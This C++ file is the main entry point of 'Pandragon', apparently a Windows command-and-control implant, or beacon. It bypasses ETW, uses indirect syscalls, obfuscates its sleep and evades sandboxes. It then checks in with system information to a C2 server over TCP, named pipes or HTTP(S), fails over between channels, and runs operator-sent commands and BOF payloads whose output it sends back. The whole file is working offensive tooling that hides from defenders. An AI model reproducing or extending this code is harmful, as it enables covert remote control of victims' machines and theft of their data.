#include "../include/resolver.h"
#include "../include/pandragon_runtime.h"
#include "../include/managers.h"
#include "../include/config_parser.h"
#include "../include/sandbox.h"
#include "../include/utils.h"
#include "../include/injection.h"
#include "../include/etw_bypass.h"
#include "../include/syscalls.h"
#include "../include/unhook.h"
#include "../include/network/transport.h"
#include "../include/network/net_abstract.h"
#include "../include/generated_config.h"

#ifdef PANDRAGON_ENABLE_PIPE
#include "../libs/network/pipe_transport.h"
#endif

#include "../libs/bastia/bastia.h"
#include "../include/coff/COFFSetup.h"
#include "coff/beacon_api_resolver.h"
#include "../include/coff/beacon_compatibility.h"
#include <cstdint>

extern "C" int __start(void);

/* ============================================================================
 * Initialization Helpers
 * ============================================================================ */

/**
 * @brief Initialize beacon configuration and validate C2 channels
 */
static bool initBeaconConfiguration(PandragonRuntime& runtime) {
    BeaconConfig* config = &runtime.getConfig();

    g_debugPrint("[initBeaconConfiguration] CONFIG_BLOB_LEN=%zu, CONFIG_BLOB[0]=0x%02x",
                 CONFIG_BLOB_LEN, CONFIG_BLOB[0]);

    bool parseResult = parseConfig(runtime.getfuncTable(), CONFIG_BLOB, CONFIG_BLOB_LEN, config);
    
    if (!parseResult) {
        g_debugPrint("[initBeaconConfiguration] Failed to parse config blob");
        return false;
    }

    ResolveStackChain(runtime.getfuncTable(), config);

    g_debugPrint("[initBeaconConfiguration] Config loaded: sleep=%lums, channel_count=%u",
                 (unsigned long)config->sleep_ms, (unsigned)config->channel_count);

    // Update runtime with config values
    runtime.setSleepDuration(config->sleep_ms);
    g_debugPrint("Set sleeping duration...");
    runtime.setJitterPercent(config->jitter_pct);
    g_debugPrint("Set jitter...");
    runtime.setKillDate(config->kill_date);
    g_debugPrint("Set kill date...");

    // Validate C2 channels
    if (config->channel_count == 0) {
        g_debugPrint("[initBeaconConfiguration] No C2 channels configured");
        return false;
    }
    g_debugPrint("There is at least one more usable C2 channel...");

    return true;
}

/**
 * @brief Initialize network layer from configuration
 */
static bool initNetworkFromConfig(PandragonRuntime& runtime) {
    const BeaconConfig* config = &runtime.getConfig();

    g_debugPrint(" config=%p, channel_count=%u",
                 (const void*)config, (unsigned)config->channel_count);

    if (config->channel_count == 0) {
        g_debugPrint(" No channels available");
        return false;
    }

    if (!config->channels) {
        g_debugPrint(" Channel array allocation failed");
        return false;
    }

    // Use setActiveChannel which handles host/path/ua + malleable resolution
    runtime.getNetworkManager().setActiveChannel(0, *config);
    g_debugPrint("[initNetworkFromConfig] Channel 0 activated");

    // Set identity
    runtime.getNetworkManager().setIdentity(runtime.getBeaconId(), runtime.getCryptoKey());

    // Select transport based on channel type
    const auto ch = &config->channels[0];
    bool transport_set = false;

#ifdef PANDRAGON_ENABLE_TCP
    if (!transport_set && ch->type == PCFG_ChannelType::TCP) {
        ::setTransport(tcpSocketRequest);
        ::setTransportType(lcg_encrypt("tcp"));
        g_debugPrint("[initNetworkFromConfig] Using TCP transport");
        transport_set = true;
    }
#endif
#ifdef PANDRAGON_ENABLE_PIPE
    if (!transport_set && ch->type == PCFG_ChannelType::PIPE) {
        ::setTransport(pipeSocketRequest);
        ::setTransportType(lcg_encrypt("pipe"));
        g_debugPrint("[initNetworkFromConfig] Using Named Pipe transport");
        transport_set = true;
    }
#endif
#ifdef PANDRAGON_ENABLE_HTTP
    if (!transport_set && ch->type == PCFG_ChannelType::HTTP) {
        ::setTransport(winhttpRequest);
        ::setTransportType(lcg_encrypt("http"));
        g_debugPrint("[initNetworkFromConfig] Using WinHTTP transport (HTTP)");
        transport_set = true;
    }
#endif
#ifdef PANDRAGON_ENABLE_HTTPS
    if (!transport_set && ch->type == PCFG_ChannelType::HTTPS) {
        ::setTransport(winhttpRequest);
        ::setTransportType(lcg_encrypt("http"));
        g_debugPrint("[initNetworkFromConfig] Using WinHTTP transport (HTTPS)");
        transport_set = true;
    }
#endif

    if (!transport_set) {
        g_debugPrint("[initNetworkFromConfig] FATAL: No transport enabled for channel type %d", ch->type);
        return false;
    }




    // Configure SSL certificate validation (default: validate)
    ::setValidateSSL(config->options.validate_ssl);
    g_debugPrint("[initNetworkFromConfig] SSL validation=%s",
                 config->options.validate_ssl ? "enabled" : "disabled");

    // ETW Bypass: Enable before checkin if configured
    if (config->options.bypass_etw) {
        g_debugPrint("[initNetworkFromConfig] BypassETW enabled - enabling ETW bypass before checkin");
        bool etwResult = ETW_Enable(runtime.getfuncTable());
        if (etwResult) {
            g_debugPrint("[initNetworkFromConfig] ETW bypass enabled successfully");
        } else {
            g_debugPrint("[initNetworkFromConfig] WARNING: ETW bypass failed to enable");
        }
    } else {
        g_debugPrint("[initNetworkFromConfig] BypassETW disabled in config");
    }

    // Check-in moved to main loop (supports lazy check-in deferral)

    g_debugPrint("[+] Using config: %s:%d poll=%s submit=%s",
                 ch->host, ch->port, ch->poll_path, ch->submit_path);

    return true;
}

/* ============================================================================
 * Runtime Checks
 * ============================================================================ */

/**
 * @brief Pre-main checks: kill date validation
 * @return true if beacon should continue, false if it should exit
 */
static bool premainChecks(PandragonRuntime& runtime) {
#ifndef DEBUG
    uint32_t killDate = runtime.getKillDate();
    if (killDate != 0) {
        if (WinUtils::isDateReached(runtime.getfuncTable(), killDate)) {
            g_debugPrint("[premainChecks] Kill date reached - exiting");
            return false;
        }
    }
#endif
    return true;
}

/* ============================================================================
 * Command Processing
 * ============================================================================ */

/**
 * @brief Process incoming command from server
 * @return true if beacon should continue, false if it should exit
 */
static bool processCommand(PandragonRuntime& runtime, const uint8_t* data, size_t len) {
    if (!data || len == 0) {
        g_debugPrint("NULL payload or zero length");
        return true;
    }

    g_VERBOSE("Received %zu bytes", len); // mi pan zu zu zu

    // First byte is opcode
    uint8_t opcode = data[0];
    const uint8_t* args = data + 1;
    size_t args_len = len - 1;

    g_debugPrint("Opcode: 0x%02x (%d)", opcode, opcode);

    // Dispatch to handler
    bool should_exit = runtime.getCommandDispatcher().dispatch(opcode, args, args_len);
    return !should_exit;
}

/* ============================================================================
 * Balkanized __start helpers
 * ============================================================================ */

static functionTable* initializeRuntime(PandragonRuntime*& out_runtime) {
    // Initialize functionTable via PEB walking
    functionTable* funcTable = InitializeFunctionTable(true, true, false, false);
    if (!funcTable) {
        g_debugPrint("Failed to initialize functionTable");
        return nullptr;
    }
    g_functionTable = funcTable;
    g_debugPrint("functionTable initialized: %p", (void*)funcTable);

    // Initialize injection module's functionTable
    SetInjectionfuncTable(funcTable);
    g_debugPrint("Injection module initialized");

    // Initialize PandragonRuntime singleton
    PandragonRuntime& runtime = PandragonRuntime::getInstance();
    BeaconError err = runtime.initialize(funcTable);
    
    if (err != BeaconError::SUCCESS) {
        g_debugPrint("Runtime initialization failed: %s", BeaconErrorToString(err));
        return nullptr;
    }
    g_debugPrint("Runtime initialized successfully");

    out_runtime = &runtime;
    return funcTable;
}

static bool configureRuntimeFeatures(PandragonRuntime& runtime) {
    // Initialize configuration
    if (!initBeaconConfiguration(runtime)) {
        g_debugPrint("Beacon configuration failed - fatal error");
        return false;
    }
    g_debugPrint("Beacon configuration loaded");

    // Initialize BOF compatibility layer with config
    setBeaconConfig(&runtime.getConfig());
    g_debugPrint("[__start] BOF compatibility initialized with spawnto config");

    // Layer indirect syscalls if configured
    const BeaconConfig* config_check = &runtime.getConfig();
    if (config_check->options.use_indirect_syscalls) {
        // Set custom pivot if configured
        if (config_check->options.indirect_pivot_set && config_check->indirect_pivot) {
            setSyscallPivot(config_check->indirect_pivot);
            g_debugPrint("[__start] Custom pivot: %s", config_check->indirect_pivot);
        }
        initSyscallsLayer(runtime.getfuncTable());
        g_debugPrint("[__start] Indirect syscalls enabled via HWBP");
    } else {
        g_debugPrint("[__start] Indirect syscalls: disabled (direct syscalls)");
    }

    // Configure sleep obfuscation method
    switch (config_check->options.sleep_obfuscation) {
    case 1: runtime.setSleepObfMethod(SleepObfMethod::EKKO);
            g_debugPrint("[__start] Sleep obfuscation: Ekko enabled");
            break;
    case 2: runtime.setSleepObfMethod(SleepObfMethod::MORPHEUS);
            g_debugPrint("[__start] Sleep obfuscation: Morpheus (WaitOnAddress)");
            break;
    default: runtime.setSleepObfMethod(SleepObfMethod::NONE);
            g_debugPrint("[__start] Sleep obfuscation: disabled");
            break;
    }

    // Sandbox evasion
    if (config_check->options.sandbox_evasion) {
        if (checkSandboxEnvironment(runtime.getfuncTable())) {
            g_debugPrint("[__start] Sandbox detected, exiting");
            return false;
        }
        g_debugPrint("[__start] Sandbox evasion check passed");
    }

    return true;
}

static bool initializeNetworkStack(PandragonRuntime& runtime) {
    // Initialize network layer
    if (!initNetworkFromConfig(runtime)) {
        g_debugPrint("Network initialization failed");
        return false;
    }
    g_debugPrint("Network layer initialized");

    return true;
}

struct LoopState {
    const BeaconConfig* config;
    uint8_t active_channel;
    int max_fails;
    uint32_t backoff_ms;
    int fail_count;
    bool checkin_sent;
    uint32_t poll_count;
    uint32_t checkin_target;
};

static LoopState setupLoopState(PandragonRuntime& runtime) {
    LoopState ls = {0};

    const BeaconConfig* config = &runtime.getConfig();

    ls.config = config;
    ls.active_channel = 0;
    ls.max_fails = config->channels[0].max_consecutive_failures;
    ls.backoff_ms = config->channels[0].backoff_sleep_ms;
    ls.fail_count = 0;

    // Lazy check-in configuration
    ls.checkin_sent = false;
    ls.poll_count = 0;
    ls.checkin_target = config->options.lazy_checkin
        ? ((uint32_t)(___rdtsc() % config->lazy_checkin_max) + 1)
        : 1;

    g_debugPrint("[__start] Lazy check-in: %s, target=%lu",
                 config->options.lazy_checkin ? "enabled" : "disabled",
                 (unsigned long)ls.checkin_target);

    g_debugPrint("Entering main beacon loop");
    g_debugPrint("Using channel %u: %s:%d poll=%s submit=%s, max_fails=%d, backoff_ms=%lu", 
                 (unsigned)ls.active_channel, 
                 config->channels[0].host, 
                 config->channels[0].port, 
                 config->channels[0].poll_path,
                 config->channels[0].submit_path,
                 ls.max_fails, (unsigned long)ls.backoff_ms);

    return ls;
}

static void handleChannelFailover(PandragonRuntime& runtime, LoopState& ls) {
    // Try C2 channel failover
    if (ls.active_channel + 1 < ls.config->channel_count) {
        ls.active_channel++;
        const auto* new_ch = &ls.config->channels[ls.active_channel];

        // Validate new channel has failover settings
        if (new_ch->max_consecutive_failures == 0 || new_ch->backoff_sleep_ms == 0) {
            g_debugPrint("[FATAL] Channel %u missing required failover settings",
                         (unsigned)ls.active_channel);
            __fastfail(7);
        }

        g_debugPrint("Failing over to channel %u: %s:%d poll=%s submit=%s",
                     (unsigned)ls.active_channel, new_ch->host, new_ch->port, new_ch->poll_path, new_ch->submit_path);

        // Use setActiveChannel: handles host/ua/path + malleable resolution
        runtime.getNetworkManager().setActiveChannel(ls.active_channel, *ls.config);

        // Switch transport based on channel type
#ifdef PANDRAGON_ENABLE_TCP
        if (new_ch->type == PCFG_ChannelType::TCP) {
            ::setTransport(tcpSocketRequest);
            ::setTransportType(lcg_encrypt("tcp"));
            g_debugPrint("[failover] Channel %u using TCP transport", (unsigned)ls.active_channel);
        } else 
#elif defined(PANDRAGON_ENABLE_PIPE)
        if (new_ch->type == PCFG_ChannelType::PIPE) {
            ::setTransport(pipeSocketRequest);
            ::setTransportType(lcg_encrypt("pipe"));
            g_debugPrint("[failover] Channel %u using Named Pipe transport", (unsigned)ls.active_channel);
        } else 
#elif defined(PANDRAGON_ENABLE_HTTP) || defined(PANDRAGON_ENABLE_HTTPS)
        {
            ::setTransport(winhttpRequest);
            ::setTransportType(lcg_encrypt("http"));
            g_debugPrint("[failover] Channel %u using WinHTTP transport", (unsigned)ls.active_channel);
        }
#endif


        // Update failover settings from new channel
        ls.max_fails = new_ch->max_consecutive_failures;
        ls.backoff_ms = new_ch->backoff_sleep_ms;
        ls.fail_count = 0;
        g_debugPrint("Channel failover complete: max_fails=%d, backoff_ms=%lu",
                     ls.max_fails, (unsigned long)ls.backoff_ms);
    } else {
        // No more channels, do backoff and reset
        g_debugPrint("All channels exhausted, backoff for %lums", (unsigned long)ls.backoff_ms);
        runtime.getfuncTable()->Sleep(ls.backoff_ms);
        ls.fail_count = 0;
        ls.active_channel = 0;  // Reset to first channel
        ls.max_fails = ls.config->channels[0].max_consecutive_failures;
        ls.backoff_ms = ls.config->channels[0].backoff_sleep_ms;
        g_debugPrint("Backoff complete, resetting to channel 0");
    }
}

static void handleLazyCheckin(PandragonRuntime& runtime, LoopState& ls) {
    // Lazy check-in: send system info on or after target poll, never twice
    if (!ls.checkin_sent && ls.poll_count >= ls.checkin_target) {
        g_VERBOSE("[checkin] poll_count=%u >= target=%lu, sending check-in",
                     (unsigned)ls.poll_count, (unsigned long)ls.checkin_target);
        size_t sysinfo_len = 0;
        char* sysinfo = gatherSystemInfo(&sysinfo_len);
        if (sysinfo && sysinfo_len > 0) {
            g_debugPrint("[checkin] System info: %zu bytes", sysinfo_len);
            (void)runtime.getNetworkManager().sendCheckin(sysinfo, sysinfo_len);
            __free(sysinfo);
        } else {
            g_debugPrint("[checkin] System info gathering failed, sending bare check-in");
            (void)runtime.getNetworkManager().sendCheckin();
        }
        ls.checkin_sent = true;
    }
}

static bool isWithinWorkHours(const BeaconConfig* config) {
    if (!config->work_hours.enabled) {
        return true;
    }

    functionTable* nt = g_functionTable;
    if (!nt || !nt->GetSystemTimeAsFileTime || !nt->FileTimeToSystemTime) {
        return true;
    }

    FILETIME ft;
    nt->GetSystemTimeAsFileTime(&ft);

    SYSTEMTIME st;
    if (!nt->FileTimeToSystemTime(&ft, &st)) {
        return true;
    }

    uint32_t current_minutes = (static_cast<uint32_t>(st.wHour) * 60) + static_cast<uint32_t>(st.wMinute);
    uint32_t start_minutes = (static_cast<uint32_t>(config->work_hours.start_hour) * 60) + static_cast<uint32_t>(config->work_hours.start_minute);
    uint32_t end_minutes = (static_cast<uint32_t>(config->work_hours.end_hour) * 60) + static_cast<uint32_t>(config->work_hours.end_minute);

    if (start_minutes <= end_minutes) {
        return (current_minutes >= start_minutes && current_minutes < end_minutes);
    } else {
        return (current_minutes >= start_minutes || current_minutes < end_minutes);
    }
}

static uint32_t getNextWorkHoursSleepMs(const BeaconConfig* config) {
    functionTable* nt = g_functionTable;
    if (!nt || !nt->GetSystemTimeAsFileTime || !nt->FileTimeToSystemTime) {
        return 30 * 60 * 1000; // fall back but idk if we can fail here since these r vital functions lol
    }

    FILETIME ft = {};
    nt->GetSystemTimeAsFileTime(&ft);

    SYSTEMTIME st;
    if (!nt->FileTimeToSystemTime(&ft, &st)) {
        return 30 * 60 * 1000;
    }

    uint32_t current_minutes = (static_cast<uint32_t>(st.wHour) * 60) + static_cast<uint32_t>(st.wMinute);
    uint32_t start_minutes = (static_cast<uint32_t>(config->work_hours.start_hour) * 60) + static_cast<uint32_t>(config->work_hours.start_minute);

    int32_t diff_minutes = static_cast<int32_t>(start_minutes) - static_cast<int32_t>(current_minutes);
    if (diff_minutes <= 0) {
        diff_minutes += 24 * 60;
    }

    if (diff_minutes > 24 * 60) {
        diff_minutes = 24 * 60;
    }

    return static_cast<uint32_t>(diff_minutes) * 60 * 1000;
}

static bool pollAndProcessCommands(PandragonRuntime& runtime, LoopState& ls) {
    uint8_t* command_data = nullptr;
    size_t command_len = 0;

    BeaconError err = runtime.getNetworkManager().pollForCommands(&command_data, &command_len);
    //runTestBOF(g_functionTable, "Z:\\home\\v\\pandragon\\BofDev\\listfiles.o"); // do not remove, debug

    if (err == BeaconError::SUCCESS && command_data != nullptr) {
        g_debugPrint("Received command payload (len=%zu)", command_len);
        bool continue_beacon = processCommand(runtime, command_data, command_len);
        __free(command_data);

        if (!continue_beacon) {
            g_debugPrint("processCommand requested shutdown");
            return false;
        }

        ls.fail_count = 0;
        g_debugPrint("Command processed successfully");
    } else {
        g_debugPrint("pollForCommands returned %s (err=%d), command_data=%p",
                     BeaconErrorToString(err), (int)err, (void*)command_data);

        // Increment fail counter and check for backoff
        if (++ls.fail_count >= ls.max_fails) {
            g_debugPrint("%d consecutive failures on channel %u", ls.fail_count, (unsigned)ls.active_channel);
            handleChannelFailover(runtime, ls);
        }
    }

    return true;
}

/* Forward declarations for Async BOF <-> Sleep Mask Integration Helpers */
static uint32_t checkAsyncBofForceSleep(void);
static bool checkAsyncBofWakeupSignals(AsyncBofManager& abm);

static void mainBeaconLoop(PandragonRuntime& runtime) {
    LoopState ls = setupLoopState(runtime);

    // Main beacon loop
    while (true) {
        // Check kill date
        if (!premainChecks(runtime)) {
            g_debugPrint("premainChecks requested exit");
            break;
        }

        // Check for stalled file transfers
        runtime.getFileTransferManager().checkTimeouts();
        g_VERBOSE("File transfer timeouts checked");

        // -- BOF Reaper: terminate hung async BOFs --
        AsyncBofManager::instance().reapCycle();

        // -- P2P Relay: drain child data before polling --
        pipeRelayCheck();

        // Check for pending key rotation (triggered by sequence number approaching wraparound)
        if (isKeyRotationPending()) {
            g_debugPrint("[MAIN] Key rotation is pending - waiting for server ROTATE_KEY command");
            // Beacon signals need by setting pending flag, server detects and responds
        }

        // Work hours check - must be BEFORE network activity and lazy check-in
        if (!isWithinWorkHours(ls.config)) {
            if (ls.config->work_hours.insomnia) {
                g_debugPrint("[WORK_HOURS] Outside hours (insomnia mode), skipping network activity");
                uint32_t sleep_ms = static_cast<uint32_t>(runtime.getSleepDuration());
                uint8_t jitter = runtime.getJitterPercent();
                g_debugPrint("Sleeping (insomnia skip, base=%ums, jitter=%u%%)", sleep_ms, (unsigned)jitter);
                ExecuteSleep(runtime.getfuncTable(), sleep_ms, jitter);
                continue;
            } else {
                uint32_t sleep_until_work = getNextWorkHoursSleepMs(ls.config);
                g_debugPrint("[WORK_HOURS] Outside work hours, sleeping %lu min until start",
                             sleep_until_work / 60000);
                ExecuteSleep(runtime.getfuncTable(), sleep_until_work, 0);
                continue;
            }
        }

        // Poll for commands
        ls.poll_count++;
        g_debugPrint("Polling for commands (poll #%u)...", (unsigned)ls.poll_count);

        if (!pollAndProcessCommands(runtime, ls)) {
            break;
        }

        // -- BOF Command Dispatch: send commands (ABORT, args) to running BOFs --
        AsyncBofManager::instance().dispatchCommands();

        // -- BOF Output Reap: spin-wait oplock -> read -> wipe --
        {
            auto& abm = AsyncBofManager::instance();
            async_bof_state* cur = abm.getHead();
            while (cur) {
                if (cur->bof_class != BOF_CLASS::LONG_RUNNING) {
                    cur = cur->next;
                    continue;
                }

                /* Handle named pipe channel */
                if (cur->channel_type == CHANNEL_TYPE_NAMED_PIPE && cur->handle) {
                    functionTable* nt = g_functionTable;
                    uint8_t header[8] = {0};
                    DWORD bytesRead = 0;

                    if (nt->ReadFile(cur->handle, header, sizeof(header), &bytesRead, NULL) && bytesRead == 8) {
                        uint32_t record_length = *(uint32_t*)&header[4];

                        if (record_length > 0 && record_length <= BOF_CHANNEL_DATA_SIZE) {
                            uint8_t* output = (uint8_t*)__malloc(record_length);
                            if (output) {
                                DWORD data_read = 0;
                                if (nt->ReadFile(cur->handle, output, record_length, &data_read, NULL)) {
                                    (void)pandragon::sendBofOutput((char*)output, data_read, cur->task_id);
                                }
                                __free(output);
                            }
                        }
                    }
                    cur->last_checkin = abm.getCurrentTimeMs();
                    cur = cur->next;
                    continue;
                }

                /* Handle shared memory channel */
                if (cur->channel) {
                    bof_channel* ch = cur->channel;

                    /* Acquire beacon_writing oplock */
                    enterLock(&ch->beacon_writing);

                    /* Wait for BOF to finish writing */
                    while (ch->bof_writing) {
                        _mm_pause();
                    }

                    if (ch->data_valid && !ch->data_acked) {
                        if (ch->record_length > 0) {
                            char* output = (char*)__malloc(ch->record_length);
                            if (output) {
                                __memcpy(output, ch->data, ch->record_length);
                                (void)pandragon::sendBofOutput(output, ch->record_length, cur->task_id);
                                __free(output);
                            }
                        }
                        ch->data_acked = 1;
                        ch->data_valid = 0;
                        ch->record_length = 0;
                        __memset(ch->data, 0, BOF_CHANNEL_DATA_SIZE);
                    }
                    cur->last_checkin = abm.getCurrentTimeMs();
                    _InterlockedExchange(&ch->beacon_writing, 0);
                }
                cur = cur->next;
            }
        }

        handleLazyCheckin(runtime, ls);

        // -- Check for Async BOF FORCE_SLEEP request (overrides configured sleep) --
        uint32_t force_sleep_ms = checkAsyncBofForceSleep();
        uint32_t sleep_ms = force_sleep_ms ? force_sleep_ms : static_cast<uint32_t>(runtime.getSleepDuration());
        uint8_t jitter = force_sleep_ms ? 0 : runtime.getJitterPercent();

        g_debugPrint("Sleeping (base=%ums, jitter=%u%%)", sleep_ms, (unsigned)jitter);
        ExecuteSleep(runtime.getfuncTable(), sleep_ms, jitter);

        // -- After wake: check for Async BOF WAKEUP_SEND / WAKEUP_EXIT --
        auto& abm = AsyncBofManager::instance();
        if (checkAsyncBofWakeupSignals(abm)) {
            /* If WAKEUP_SEND was handled, we may want to sleep again briefly
             * to maintain the mask. If WAKEUP_EXIT, continue main loop. */
            if (force_sleep_ms) {
                g_debugPrint("[MAIN] Re-entering sleep mask after async BOF wakeup");
                ExecuteSleep(runtime.getfuncTable(), 1000, 0);  /* Short sleep to maintain mask */
            }
        }
    }
}

/* ============================================================================
 * Async BOF <-> Sleep Mask Integration Helpers
 * ============================================================================ */

static uint32_t checkAsyncBofForceSleep(void) {
    auto& abm = AsyncBofManager::instance();
    async_bof_state* cur = abm.getHead();
    while (cur) {
        if (cur->bof_class == BOF_CLASS::LONG_RUNNING && cur->requested_sleep_sec > 0) {
            uint32_t sleep_ms = cur->requested_sleep_sec * 1000;
            g_debugPrint("[MAIN] Async BOF task %u requested FORCE_SLEEP: %u sec", cur->task_id, cur->requested_sleep_sec);
            cur->requested_sleep_sec = 0;  /* Consume the request */
            return sleep_ms;
        }
        cur = cur->next;
    }
    return 0;
}

static bool checkAsyncBofWakeupSignals(AsyncBofManager& abm) {
    async_bof_state* cur = abm.getHead();
    bool has_wakeup_send = false;
    bool has_wakeup_exit = false;
    async_bof_state* exit_state = nullptr;

    while (cur) {
        if (cur->bof_class == BOF_CLASS::LONG_RUNNING && cur->channel) {
            bof_channel* ch = cur->channel;
            if (ch->signal == CHANNEL_SIGNAL_WAKEUP_SEND) {
                has_wakeup_send = true;
                ch->signal = 0;
                ch->signal_ack = 0;
            } else if (ch->signal == CHANNEL_SIGNAL_WAKEUP_EXIT) {
                has_wakeup_exit = true;
                exit_state = cur;
                ch->signal = 0;
                ch->signal_ack = 0;
            }
        }
        cur = cur->next;
    }

    if (has_wakeup_send) {
        g_debugPrint("[MAIN] Async BOF requested WAKEUP_SEND - flushing output");
        /* Flush output for all async BOFs */
        async_bof_state* cur2 = abm.getHead();
        while (cur2) {
            if (cur2->bof_class == BOF_CLASS::LONG_RUNNING && cur2->channel) {
                bof_channel* ch = cur2->channel;
                if (ch->data_valid && !ch->data_acked && ch->record_length > 0) {
                    char* output = (char*)__malloc(ch->record_length);
                    if (output) {
                        __memcpy(output, ch->data, ch->record_length);
                        (void)pandragon::sendBofOutput(output, ch->record_length, cur2->task_id);
                        __free(output);
                    }
                    ch->data_acked = 1;
                    ch->data_valid = 0;
                    ch->record_length = 0;
                    __memset(ch->data, 0, BOF_CHANNEL_DATA_SIZE);
                }
            }
            cur2 = cur2->next;
        }
    }

    if (has_wakeup_exit && exit_state) {
        g_debugPrint("[MAIN] Async BOF task %u requested WAKEUP_EXIT - cleaning up", exit_state->task_id);
        /* Clean up the completed async BOF */
        if (exit_state->handle) {
            g_functionTable->NtClose(exit_state->handle);
            exit_state->handle = NULL;
        }
        if (exit_state->threadCtx) {
            async_bof_thread_ctx* threadCtx = (async_bof_thread_ctx*)exit_state->threadCtx;
            CleanupCOFF(threadCtx->ctx);
            __free(threadCtx->ctx);
            __free(threadCtx);
            exit_state->threadCtx = NULL;
        }
        abm.remove(exit_state);
    }

    return has_wakeup_send || has_wakeup_exit;
}

int __start(void) {
#ifdef DEBUG
    // --subsystem,windows provides no console; allocate one so printf/debugPrint works.
    HMODULE kernel32 = GetModuleBaseAddressA("kernel32.dll");
    if (kernel32) {
        typedef BOOL (WINAPI *fnAllocConsole)(void);
        typedef HANDLE (WINAPI *fnGetStdHandle)(DWORD);
        fnAllocConsole pAllocConsole = (fnAllocConsole)__GetProcAddress(kernel32, "AllocConsole");
        fnGetStdHandle pGetStdHandle  = (fnGetStdHandle)__GetProcAddress(kernel32, "GetStdHandle");
        if (pAllocConsole && pAllocConsole()) {
            HANDLE hConOut = pGetStdHandle ? pGetStdHandle(STD_OUTPUT_HANDLE) : INVALID_HANDLE_VALUE;
            if (hConOut != INVALID_HANDLE_VALUE)
                getCurrentPEB()->ProcessParameters->StdOutputHandle = hConOut;
        }
    }
#endif

    PandragonRuntime* runtime = nullptr;

    functionTable* nt = initializeRuntime(runtime);
    if (!nt) return -1; // oh no!

    if (!configureRuntimeFeatures(*runtime)) return -1;

    if (!initializeNetworkStack(*runtime)) return -1;

    initBOFEngineTable(nt);
    InitDllCache();
    mainBeaconLoop(*runtime);
    runtime->shutdown();
    ShutdownDllCache(nt);

    g_debugPrint("Exiting main loop, returning.");
    g_debugPrint("Thank you for using Pandragon.");
    g_debugPrint("\t - The Futuristic Gadgets Lab.");
    return 0;
}

/*
Fun fact; there's no difference between
type variable = {}; and
type variable
when using optimizations, both compile to the same assembly
*/